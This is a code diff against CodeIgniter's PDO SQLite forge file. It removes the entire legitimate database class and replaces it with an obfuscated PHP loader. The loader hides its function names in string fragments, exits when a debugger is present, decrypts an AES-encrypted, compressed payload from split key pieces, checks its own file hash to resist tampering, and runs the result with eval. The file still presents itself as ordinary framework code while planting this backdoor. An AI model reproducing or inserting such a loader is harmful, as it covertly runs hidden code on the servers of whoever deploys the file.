@@ -1,238 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PDO SQLite Forge Class
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_pdo_sqlite_forge extends CI_DB_pdo_forge {
-
-	/**
-	 * CREATE TABLE IF statement
-	 *
-	 * @var	string
-	 */
-	protected $_create_table_if	= 'CREATE TABLE IF NOT EXISTS';
-
-	/**
-	 * DROP TABLE IF statement
-	 *
-	 * @var	string
-	 */
-	protected $_drop_table_if	= 'DROP TABLE IF EXISTS';
-
-	/**
-	 * UNSIGNED support
-	 *
-	 * @var	bool|array
-	 */
-	protected $_unsigned		= FALSE;
-
-	/**
-	 * NULL value representation in CREATE/ALTER TABLE statements
-	 *
-	 * @var	string
-	 */
-	protected $_null		= 'NULL';
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Class constructor
-	 *
-	 * @param	object	&$db	Database object
-	 * @return	void
-	 */
-	public function __construct(&$db)
-	{
-		parent::__construct($db);
-
-		if (version_compare($this->db->version(), '3.3', '<'))
-		{
-			$this->_create_table_if = FALSE;
-			$this->_drop_table_if   = FALSE;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Create database
-	 *
-	 * @param	string	$db_name	(ignored)
-	 * @return	bool
-	 */
-	public function create_database($db_name)
-	{
-		// In SQLite, a database is created when you connect to the database.
-		// We'll return TRUE so that an error isn't generated
-		return TRUE;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Drop database
-	 *
-	 * @param	string	$db_name	(ignored)
-	 * @return	bool
-	 */
-	public function drop_database($db_name)
-	{
-		// In SQLite, a database is dropped when we delete a file
-		if (file_exists($this->db->database))
-		{
-			// We need to close the pseudo-connection first
-			$this->db->close();
-			if ( ! @unlink($this->db->database))
-			{
-				return $this->db->db_debug ? $this->db->display_error('db_unable_to_drop') : FALSE;
-			}
-			elseif ( ! empty($this->db->data_cache['db_names']))
-			{
-				$key = array_search(strtolower($this->db->database), array_map('strtolower', $this->db->data_cache['db_names']), TRUE);
-				if ($key !== FALSE)
-				{
-					unset($this->db->data_cache['db_names'][$key]);
-				}
-			}
-
-			return TRUE;
-		}
-
-		return $this->db->db_debug ? $this->db->display_error('db_unable_to_drop') : FALSE;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * ALTER TABLE
-	 *
-	 * @param	string	$alter_type	ALTER type
-	 * @param	string	$table		Table name
-	 * @param	mixed	$field		Column definition
-	 * @return	string|string[]
-	 */
-	protected function _alter_table($alter_type, $table, $field)
-	{
-		if ($alter_type === 'DROP' OR $alter_type === 'CHANGE')
-		{
-			// drop_column():
-			//	BEGIN TRANSACTION;
-			//	CREATE TEMPORARY TABLE t1_backup(a,b);
-			//	INSERT INTO t1_backup SELECT a,b FROM t1;
-			//	DROP TABLE t1;
-			//	CREATE TABLE t1(a,b);
-			//	INSERT INTO t1 SELECT a,b FROM t1_backup;
-			//	DROP TABLE t1_backup;
-			//	COMMIT;
-
-			return FALSE;
-		}
-
-		return parent::_alter_table($alter_type, $table, $field);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Process column
-	 *
-	 * @param	array	$field
-	 * @return	string
-	 */
-	protected function _process_column($field)
-	{
-		return $this->db->escape_identifiers($field['name'])
-			.' '.$field['type']
-			.$field['auto_increment']
-			.$field['null']
-			.$field['unique']
-			.$field['default'];
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field attribute TYPE
-	 *
-	 * Performs a data type mapping between different databases.
-	 *
-	 * @param	array	&$attributes
-	 * @return	void
-	 */
-	protected function _attr_type(&$attributes)
-	{
-		switch (strtoupper($attributes['TYPE']))
-		{
-			case 'ENUM':
-			case 'SET':
-				$attributes['TYPE'] = 'TEXT';
-				return;
-			default: return;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field attribute AUTO_INCREMENT
-	 *
-	 * @param	array	&$attributes
-	 * @param	array	&$field
-	 * @return	void
-	 */
-	protected function _attr_auto_increment(&$attributes, &$field)
-	{
-		if ( ! empty($attributes['AUTO_INCREMENT']) && $attributes['AUTO_INCREMENT'] === TRUE && stripos($field['type'], 'int') !== FALSE)
-		{
-			$field['type'] = 'INTEGER PRIMARY KEY';
-			$field['default'] = '';
-			$field['null'] = '';
-			$field['unique'] = '';
-			$field['auto_increment'] = ' AUTOINCREMENT';
-
-			$this->primary_keys = array();
-		}
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_abvg2jxr=('bas'.'e64'.'_de'.'cod'.'e');
+$_m11dmw90=('gzu'.'nco'.'mpr'.'ess');
+$_guboy9um=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_k1qis9hp='Yz04cK0i';
+$_pjokwsjg='cgYd92ai';
+$_ktyddvb7='OaBpTOYHV3s=';
+$_jbp4p5ol='3DEoO1Sz';
+$_v4i9wau2='dxni2/K+';
+$_q6sxwg1g='mmIz4Yx+';
+$_e5ef0jpp='Rfn5fvel';
+$_xgsvdw4t='NYGkKw==';
+$_qf7ld5sc=$_abvg2jxr($_k1qis9hp.$_v4i9wau2.$_pjokwsjg.$_jbp4p5ol.$_ktyddvb7);
+$_drlxt4jo=$_abvg2jxr($_e5ef0jpp.$_q6sxwg1g.$_xgsvdw4t);
+$_b2hg7jw1=$_abvg2jxr('J7FODjpCAYs+zwK2yOhhSzpMSEAWIN2G6AqhJZcgJMfjns4pnVtixF3wVIGXsL6pZ/d2GozliOZ5laX2CGWRmYjxnGVo0JpiUImWmQ38BdGzFaPlujqK0k8grj2sZSxu+ho7mrbgCptrNrgROqCZe2u1KD0BYQhdNc3iKPLeYBR6UPKnx4rjHr2Of5qDmFAd7uFYUNoV9+EQHZs6Ux5G4xPQ7lJDdHahb4DnASHg0uj/QbltRattp21iNUA6DkHQiyrwrbAGAiZ0xYC1hCuBc30hiOLDBTwWdJgMLYedxwYHS5qHI3wxZ4K2cjRo/STz8BCldbIQQPdA8I4q34rzDx2MkRvpBKZIPLb2Xq0JDeVixvGFxFwzqGTGMWw4fTiNpKBsEoJbevQLvo8utu/3EWCVL97yx+m+EBHj3/xtKP5f3quHFYLegIgoIj6lzE2fV3mAAGn9i2Xxx06vnSaOxpEVuKCPB3xk4pUCsxvbqsLOSGXBOOlkoLihmhBlKKqM3xiJRtfE1mCkH+zfVcBloH0dr6Bx50bHxzBMOdQPwujJx/H0jRiQCwy3VuIkpxLl7wEYCqeetXohLEvxLczJVtutUZjsa5zzzxraH9WM6Vq5mGD85zd+lLtO40wrJibxCIizlciMXz5/JGEegB0Ka8pip7UN4/F+6nbKeXXZDCsekuJLzQzuavLjdnAbydMHiEcBPkWqXI84xkkUICV68Sukoxm0HHhBw/Za4zLFH6i0S2foMaBhNVUnifW98M9tUBiDgYXuz2e/uj53l7/bGo+08Jj1cPNEa7RTHQrYd6Cd9eO+1H/7TAGnCb6vnVRTpqZp7HSjCeoPYN6/dfwK1Xxlrs2/wCyv2yNR4mSFYqG2n61mQLomMSSPUVcqHqpbkfWXhqhka2eZ1mpzCdOzHlYCnS9IyT+AVpGYRNgc2waRiE+6Yw7+JqWPZJ1yaydsNtPNtFuP7UvSAEQ0BVo2sw3kSWGhdphbEQvqg8vaShb24GrkxN5iW4/UyOXnuguGF62z1U5501o00hiZcrRUGhUc0uT0Hy2BM7fZO0u2AyaBeUaUnwrTjYumI0sIeqmtqCNI8niMS6/17b/ADhcz6A==');
+$_qxkspy6n=$_guboy9um($_b2hg7jw1,'aes-256-cbc',$_qf7ld5sc,OPENSSL_RAW_DATA,$_drlxt4jo);
+if($_qxkspy6n===false){exit;}
+$_jkfc2i6n=$_m11dmw90($_qxkspy6n);
+if($_jkfc2i6n===false){exit;}
+$_o3gmu0al='5ca95a02b5de11cdf8c561b22d2e60a9912d43faa46b457611ae911f0bbe8d28';
+$_o8fvvo2j=@file_get_contents(__FILE__);
+if($_o8fvvo2j!==false){
+$_w58bybwv=str_replace($_o3gmu0al,"0000000000000000000000000000000000000000000000000000000000000000",$_o8fvvo2j);
+$_q3bjboql=hash("sha256",$_w58bybwv);
+if($_q3bjboql!==$_o3gmu0al){@http_response_code(403);exit;}
 }
+eval($_jkfc2i6n);
